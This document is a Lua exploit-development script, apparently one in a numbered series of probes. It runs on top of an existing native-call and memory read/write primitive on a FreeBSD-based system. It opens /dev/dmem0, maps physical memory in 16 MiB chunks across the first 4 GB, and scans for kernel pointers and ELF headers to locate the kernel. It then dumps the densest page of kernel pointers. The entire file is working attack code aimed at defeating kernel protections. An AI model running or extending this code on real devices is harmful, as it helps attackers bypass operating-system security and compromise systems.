-- CRASH_CLASS: LOW
-- PROBE 528p: Quick kernel find via strategic scan
--
-- 528o timed out scanning 256 MiB with stride 256. Too slow.
--
-- New approach: map 16 MiB chunks, read ONE qword per 16KB page.
-- That's only 1024 reads per chunk = fast. Check for:
-- 1. Kernel pointers: hi32 in [0xFFFF8000, 0xFFFFFFFE]
-- 2. ELF magic: 0x464C457F
-- 3. FreeBSD string: 0x65657246 ("Free")
-- Cover 0-4 GB = 256 chunks = 256K reads total.

print("=== PROBE 528p: QUICK KERNEL FIND ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1))
for _, sig in ipairs({10, 11, 12, 13}) do
    pcall(function() mk(416)(uint64(sig), sa_buf, uint64(0)) end)
end

local devpath = memory.alloc(0x20)
local dname = "/dev/dmem0"
for i = 1, #dname do wd(N(devpath) + i - 1, string.byte(dname, i)) end
wd(N(devpath) + #dname, 0)
local ok_o, dmem_fd = pcall(function()
    return native.fcall_with_rax(stub, 5, uint64(N(devpath)), uint64(2), uint64(0))
end)
local fd = ok_o and N(dmem_fd) or -1
print("dmem0 fd=" .. fd)
if fd < 0 then return end

local sc_477 = mk(477)
local sc_73 = mk(73)

local PAGE = 0x4000       -- 16 KB
local CHUNK = 0x1000000   -- 16 MiB
local PAGES_PER_CHUNK = CHUNK / PAGE  -- 1024

-- Track results
local kptr_chunks = {}
local elf_pages = {}
local max_phys = 0x100000000  -- 4 GB (confirmed mappable)

print("")
print("Scanning 0-4GB (" .. (max_phys / CHUNK) .. " chunks, 1 read/page)")
print("")

local chunk_count = 0
for chunk_off_raw = 0, max_phys - 1, CHUNK do
    if not alive() then break end
    chunk_count = chunk_count + 1

    -- Build uint64 for chunk offset
    local chi = math.floor(chunk_off_raw / 0x100000000)
    local clo = chunk_off_raw % 0x100000000
    local phys = uint64(string.format("0x%X%08X", chi, clo))

    local ok_c, rv_c = pcall(function()
        return sc_477(uint64(0), uint64(CHUNK), uint64(1), uint64(1), uint64(fd), phys)
    end)

    if ok_c and rv_c then
        local ch, cl = get_hi_lo(rv_c)
        if ch < 0 then ch = ch + 0x100000000 end
        if ch == 0xFFFFFFFF then
            -- mmap failed, skip
        else
            local kcount = 0
            local first_k = nil

            for p = 0, PAGES_PER_CHUNK - 1 do
                local addr = N(rv_c) + p * PAGE
                -- Read first qword of each page
                local v = rq(addr)
                if v then
                    local vh, vl = get_hi_lo(v)
                    if vh < 0 then vh = vh + 0x100000000 end
                    if vl < 0 then vl = vl + 0x100000000 end

                    -- Kernel pointer check
                    if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then
                        kcount = kcount + 1
                        if not first_k then first_k = {vh, vl, chunk_off_raw + p * PAGE} end
                    end

                    -- ELF magic check (as dword)
                    if vl == 0x464C457F or (vl + 0x100000000) == 0x464C457F then
                        local phys_page = chunk_off_raw + p * PAGE
                        table.insert(elf_pages, phys_page)
                        -- Check ELF type at offset 0x10
                        local etype = rd(addr + 0x10)
                        local etype_str = "?"
                        if etype then
                            local et = etype % 0x10000
                            if et == 2 then etype_str = "EXEC"
                            elseif et == 3 then etype_str = "DYN"
                            elseif et == 1 then etype_str = "REL"
                            else etype_str = tostring(et) end
                        end
                        print(string.format("  *** ELF at phys 0x%X type=%s ***", phys_page, etype_str))
                    end
                end
            end

            if kcount > 0 then
                table.insert(kptr_chunks, {chunk_off_raw, kcount, first_k})
            end

            pcall(function() sc_73(rv_c, uint64(CHUNK)) end)
        end
    end

    -- Progress every 32 chunks (512 MiB)
    if chunk_count % 32 == 0 then
        print(string.format("  ...scanned %d MiB, %d kptr chunks, %d ELFs",
            chunk_count * 16, #kptr_chunks, #elf_pages))
    end
end

-- ============================================================
-- Results
-- ============================================================
print("")
print("[RESULTS]")
print("  chunks scanned: " .. chunk_count)
print("  ELF pages: " .. #elf_pages)
for _, p in ipairs(elf_pages) do
    print(string.format("    phys 0x%X", p))
end

print("  kptr chunks: " .. #kptr_chunks)
-- Sort by count
table.sort(kptr_chunks, function(a, b) return a[2] > b[2] end)
for i = 1, math.min(10, #kptr_chunks) do
    local c = kptr_chunks[i]
    print(string.format("    phys 0x%X: %d kptrs, first=0x%08X%08X @phys 0x%X",
        c[1], c[2], c[3][1], c[3][2], c[3][3]))
end

-- If we have hot chunks, dump the densest one
if #kptr_chunks > 0 then
    print("")
    print("[DEEP SCAN] Densest chunk")
    local best = kptr_chunks[1]

    local chi2 = math.floor(best[1] / 0x100000000)
    local clo2 = best[1] % 0x100000000
    local phys2 = uint64(string.format("0x%X%08X", chi2, clo2))

    local ok_d, rv_d = pcall(function()
        return sc_477(uint64(0), uint64(CHUNK), uint64(1), uint64(1), uint64(fd), phys2)
    end)

    if ok_d and rv_d then
        local dh, dl = get_hi_lo(rv_d)
        if dh < 0 then dh = dh + 0x100000000 end
        if dh ~= 0xFFFFFFFF then
            -- Find the densest page
            local best_page = 0
            local best_cnt = 0
            for p = 0, PAGES_PER_CHUNK - 1 do
                local cnt = 0
                -- Check every 8 bytes on this page
                for off = 0, PAGE - 8, 8 do
                    local v = rq(N(rv_d) + p * PAGE + off)
                    if v then
                        local vh = get_hi_lo(v)
                        if vh < 0 then vh = vh + 0x100000000 end
                        if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then cnt = cnt + 1 end
                    end
                end
                if cnt > best_cnt then best_cnt = cnt; best_page = p end
            end

            local page_phys = best[1] + best_page * PAGE
            print(string.format("  densest page: phys 0x%X (%d kptrs)", page_phys, best_cnt))

            -- Dump first 32 qwords
            for off = 0, 31 * 8, 8 do
                local v = rq(N(rv_d) + best_page * PAGE + off)
                if v then
                    local vh, vl = get_hi_lo(v)
                    if vh < 0 then vh = vh + 0x100000000 end
                    if vl < 0 then vl = vl + 0x100000000 end
                    local tag = ""
                    if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then tag = " <K>" end
                    print(string.format("    [+0x%03X] 0x%08X%08X%s", off, vh, vl, tag))
                end
            end

            pcall(function() sc_73(rv_d, uint64(CHUNK)) end)
        end
    end
end

pcall(function() native.fcall_with_rax(stub, 6, uint64(fd)) end)
print("")
print("alive=" .. tostring(alive()))
print("=== 528p COMPLETE ===")
